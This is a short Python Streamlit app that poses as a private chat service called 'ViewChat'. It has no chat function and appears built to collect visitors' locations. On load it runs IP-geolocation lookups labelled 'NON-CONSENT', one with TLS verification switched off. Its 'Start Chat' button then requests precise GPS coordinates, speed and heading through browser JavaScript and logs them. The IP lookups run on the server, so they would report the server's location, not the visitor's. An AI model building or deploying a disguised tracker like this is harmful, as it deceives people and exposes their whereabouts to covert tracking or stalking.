import requests
import streamlit as st
from datetime import datetime, timezone

import urllib3
from streamlit_js_eval import streamlit_js_eval

# Suppress only InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

st.set_page_config(page_title="Your Very own ViewChat - Only you", layout="centered")


# --------- 1. Always log coarse IP-based location (no consent needed) ----------
try:
    # ipapi.co (HTTPS)
    ip_info = requests.get("https://ipapi.co/json/", timeout=10, verify=False).json()
    # ip-api.com (HTTP)
    ip_info2 = requests.get("http://ip-api.com/json/", timeout=10).json()

    print("=== NON-CONSENT ===")
    print(ip_info)
    print("=== NON-CONSENT 2===")
    print(ip_info2)
    print("=== END NON-CONSENT PAYLOAD ===")

except Exception as e:
    print("IP-based lookup failed:", e)

# --------- 2. Consent button for precise GPS ----------
st.title("Welcome to View Chat!")
if st.button("Start Chat"):
    coords = streamlit_js_eval(
        js_expressions="""
        new Promise((resolve, reject) => {
            if (!navigator.geolocation) { reject('unsupported'); }
            navigator.geolocation.getCurrentPosition(
                p => resolve({
                    latitude: p.coords.latitude,
                    longitude: p.coords.longitude,
                    accuracy_m: p.coords.accuracy,
                    altitude: p.coords.altitude,
                    altitudeAccuracy: p.coords.altitudeAccuracy,
                    heading: p.coords.heading,
                    speed: p.coords.speed,
                    timestamp: p.timestamp
                }),
                err => reject(err.message),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        })
        """,
        key="geo"
    )

    gps_payload = {
        "method": "geolocation",
        "server_time_utc": datetime.now(timezone.utc).isoformat()
    }

    if coords:
        gps_payload["coords"] = coords
        gps_payload["status"] = "success"
    else:
        gps_payload["status"] = "no_data_or_denied"

    print("=== CONSENT PAYLOAD (GPS) ===")
    print(gps_payload)
    print("=== END CONSENT PAYLOAD ===")
